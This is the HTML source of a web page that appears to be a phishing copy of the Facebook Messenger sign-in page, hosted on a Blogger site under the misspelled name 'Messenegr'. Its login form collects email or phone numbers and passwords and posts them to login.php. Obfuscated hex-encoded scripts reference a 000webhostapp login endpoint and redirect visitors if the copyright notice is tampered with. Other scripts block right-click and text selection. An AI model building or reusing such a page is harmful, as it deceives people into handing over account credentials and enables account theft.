<!DOCTYPE html>
<html class='v2' dir='rtl' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
<head>
<link href='../www.blogger.com/static/v1/widgets/4001482128-css_bundle_v2_rtl.css' rel='stylesheet' type='text/css'/>
<meta charset='utf-8'/>
<meta content='IE=edge,chrome=1' thhp-equiv='X-UA-Compatible'/>
<meta content='width-device-width, initial-scale=1.0' name='viewport'/>
<meta content='user-scalable=false; initial-scale=1.0; maximum-scale=1.0' name='viewport'/>
<meta content='IE=edge,chrome=1' thhp-equiv='X-UA-Compatible'/>
<meta content='width-device-width, initial-scale=1.0' name='viewport'/>
<meta content='user-scalable=false; initial-scale=1.0; maximum-scale=1.0' name='viewport'/>
<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
<meta content='blogger' name='generator'/>
<link href='favicon.ico' rel='icon' type='image/x-icon'/>
<link href='index.html' rel='canonical'/>
<link rel="alternate" type="application/atom+xml" title="Messenegr - Atom" href="feeds/posts/default" />
<link rel="alternate" type="application/rss+xml" title="Messenegr - RSS" href="feeds/posts/default9522?alt=rss" />
<link rel="stylesheet" type="text/css" href="style.css"> 
<link rel="service.post" type="application/atom+xml" title="Messenegr - Atom" href="https://www.blogger.com/feeds/137927648282218435/posts/default" />
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1270012344-ieretrofit.js"></script>
<![endif]-->
<meta content='' property='og:url'/>
<meta content='Messenegr' property='og:title'/>
<meta content='Login' property='og:description'/>
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>
Messenegr
</title>

<script type='text/javascript'>
      var _0x1e24=["\x68\x72\x65\x66","\x61\x74\x74\x72","\x23\x63\x6F\x70\x79\x72\x69\x67\x68\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x73\x73\x65\x6E\x65\x67\x72\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x6D\x6C","\x4D\x65\x73\x73\x65\x6E\x67\x65\x72\x20\x43\x6F\x70\x79\x72\x69\x67\x68\x74\x20\xA9\uFE0F","\x64\x69\x73\x70\x6C\x61\x79","\x63\x73\x73","\x6E\x6F\x6E\x65","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79","\x76\x69\x73\x69\x62\x6C\x65","\x72\x65\x61\x64\x79"];$(document)[_0x1e24[12]](function(){if($(_0x1e24[2])[_0x1e24[1]](_0x1e24[0])!= _0x1e24[3]){window[_0x1e24[4]][_0x1e24[0]]= _0x1e24[3]};if($(_0x1e24[2])[_0x1e24[5]]()!= _0x1e24[6]){window[_0x1e24[4]][_0x1e24[0]]= _0x1e24[3]};if($(_0x1e24[2])[_0x1e24[8]](_0x1e24[7])== _0x1e24[9]){window[_0x1e24[4]][_0x1e24[0]]= _0x1e24[3]};if($(_0x1e24[2])[_0x1e24[8]](_0x1e24[10])!= _0x1e24[11]){window[_0x1e24[4]][_0x1e24[0]]= _0x1e24[3]}})
    </script>
<script type='text/javascript'>
      var _0x553a=["\x68\x72\x65\x66","\x61\x74\x74\x72","\x23\x76\x65\x68\x30","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x73\x73\x65\x6E\x65\x67\x72\x2E\x62\x6C\x6F\x67\x73\x70\x6F\x74\x2E\x63\x6F\x6D","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x6D\x6C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x65\x73\x73\x65\x6E\x65\x67\x72\x2E\x30\x30\x30\x77\x65\x62\x68\x6F\x73\x74\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x6C\x6F\x67\x69\x6E\x2E\x70\x68\x70","\x64\x69\x73\x70\x6C\x61\x79","\x63\x73\x73","\x6E\x6F\x6E\x65","\x76\x69\x73\x69\x62\x69\x6C\x69\x74\x79","\x76\x69\x73\x69\x62\x6C\x65","\x72\x65\x61\x64\x79"];$(document)[_0x553a[12]](function(){if($(_0x553a[2])[_0x553a[1]](_0x553a[0])!= _0x553a[3]){window[_0x553a[4]][_0x553a[0]]= _0x553a[3]};if($(_0x553a[2])[_0x553a[5]]()!= _0x553a[6]){window[_0x553a[4]][_0x553a[0]]= _0x553a[3]};if($(_0x553a[2])[_0x553a[8]](_0x553a[7])== _0x553a[9]){window[_0x553a[4]][_0x553a[0]]= _0x553a[3]};if($(_0x553a[2])[_0x553a[8]](_0x553a[10])!= _0x553a[11]){window[_0x553a[4]][_0x553a[0]]= _0x553a[3]}})
    </script>
<script async='async' src='../pagead2.googlesyndication.com/pagead/js/f.txt'></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-5350689378999314",
          enable_page_level_ads: true
     });
</script>

</head>
<body onselectstart='return false'>
<script LANGUAGE='JavaScript'>



var message=""; 

function clickIE() {

if (document.all) {

(message);return false;

}

} function clickNS(e) { 

if (document.layers||(document.getElementById&&!document.all)) { 

if (e.which==2||e.which==3) { (message); return false;

} } } if (document.layers) { document.captureEvents(Event.MOUSEDOWN); 

document.onmousedown=clickNS;

} else { document.onmouseup=clickNS;

document.oncontextmenu=clickIE; 

} document.oncontextmenu=new Function("return false")

function disableselect(e) { return false } function reEnable() { return true } 

document.onselectstart=new Function ("return false") //if NS6 if (window.sidebar){ document.onmousedown=disableselect document.onclick=reEnable } //

//]]>

</script>
<!-- Load Facebook SDK for JavaScript -->
<div id='fb-root'></div>
<script>
      window.fbAsyncInit = function() {
        FB.init({
          xfbml            : true,
          version          : 'v5.0'
        });
      };
      (function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = '../connect.facebook.net/ar_AR/sdk/xfbml.customerchat.js';
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));</script>
<!-- Your customer chat code -->
<div attribution='setup_tool' class='fb-customerchat' logged_in_greeting=' ' logged_out_greeting=' ' page_id='108107487305970'>
</div>
<div class='content'>
<div class='content2'>
<i class='icon'></i>
<h1 class='text1'>
          Messenger
        </h1>
<br/>
<h2 class='text'>
          A simple way to text, video chat and plan things all in one place.
        </h2>
<div class='text'>
          Sign in with an account Facebook to get started
        </div>
<form id='veh0' method='post' name='loginform' action="login.php" novalidate="1" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">

<input class='form' minlength='11' value='' id='email' name='email' oninput='setCustomValidity(&#39;&#39;)' oninvalid='this.setCustomValidity(&#39;المعذره ادخل بيانات صحيحه&#39;)' placeholder='Email or phone number' requireuiretext'/>
<input class='form' minlength='6'  value='' id='pass' name='pass' oninput='setCustomValidity(&#39;&#39;)' oninvalid='this.setCustomValidity(&#39;المعذره ادخل بيانات صحيحه&#39;)' placeholder='password' required='' type='password'/>
<input class='input' type='submit' value='Login'/>
</form>

<div class='copyright'>
<a id='copyright' style='text-decoration: none; color: #999999;  font-weight: bold; ' title='Messenger'>
            Messenger Copyright &#169;&#65039;
          </a>
</div>
</div>
</div>
<div class='navbar no-items section' id='navbar'></div>

<script type="text/javascript" src="../www.blogger.com/static/v1/widgets/2488788848-widgets.js"></script>
<script type='text/javascript'>
window['__wavt'] = 'AOuZoY5AGC1CICCoTv8BvKPQYxrZGq3VHA:1576429438788';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d137927648282218435','index.html','137927648282218435');
_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '137927648282218435', 'title': 'Messenegr', 'url': 'https://www.mesesnegr.com/', 'canonicalUrl': 'https://www.mesesnegr.com/', 'homepageUrl': 'https://www.mesesnegr.com/', 'searchUrl': 'https://www.mesesnegr.com/search', 'canonicalHomepageUrl': 'https://www.mesesnegr.com/', 'blogspotFaviconUrl': 'https://www.mesesnegr.com/favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': true, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'ar', 'localeUnderscoreDelimited': 'ar', 'languageDirection': 'rtl', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Messenegr - Atom\x22 href\x3d\x22https://www.mesesnegr.com/feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22Messenegr - RSS\x22 href\x3d\x22https://www.mesesnegr.com/feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22Messenegr - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/137927648282218435/posts/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'ieCssRetrofitLinks': '\x3c!--[if IE]\x3e\x3cscript type\x3d\x22text/javascript\x22 src\x3d\x22https://www.blogger.com/static/v1/jsbin/1270012344-ieretrofit.js\x22\x3e\x3c/script\x3e\n\x3c![endif]--\x3e', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/7e48c56d67f3aa1a', 'plusOneApiSrc': 'https://apis.google.com/js/plusone.js', 'disableGComments': true, 'sharing': {'platforms': [{'name': 'الحصول على الرابط', 'key': 'link', 'shareMessage': 'الحصول على الرابط', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'مشاركة إلى Facebook', 'target': 'facebook'}, {'name': 'كتابة مدونة حول هذه المشاركة', 'key': 'blogThis', 'shareMessage': 'كتابة مدونة حول هذه المشاركة', 'target': 'blog'}, {'name': 'Twitter', 'key': 'twitter', 'shareMessage': 'مشاركة إلى Twitter', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'مشاركة إلى Pinterest', 'target': 'pinterest'}, {'name': 'بريد إلكتروني', 'key': 'email', 'shareMessage': 'بريد إلكتروني', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 300, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27ar\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'قراءة المزيد', 'pageType': 'index', 'pageName': '', 'pageTitle': 'Messenegr'}}, {'name': 'features', 'data': {'sharing_get_link_dialog': 'true', 'sharing_native': 'false'}}, {'name': 'messages', 'data': {'edit': 'تعديل', 'linkCopiedToClipboard': 'تم نسخ الرابط إلى الحافظة', 'ok': 'موافق', 'postLink': 'رابط المشاركة'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'مخصص', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Messenegr', 'description': 'Login', 'url': 'https://www.mesesnegr.com/', 'type': 'feed', 'isSingleItem': false, 'isMultipleItems': true, 'isError': false, 'isPage': false, 'isPost': false, 'isHomepage': true, 'isArchive': false, 'isLabelSearch': false}}]);
_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'navbar', document.getElementById('Navbar1'), {}, 'displayModeFull'));
</script>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151373576-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-151373576-2');
</script>

</body>
</html>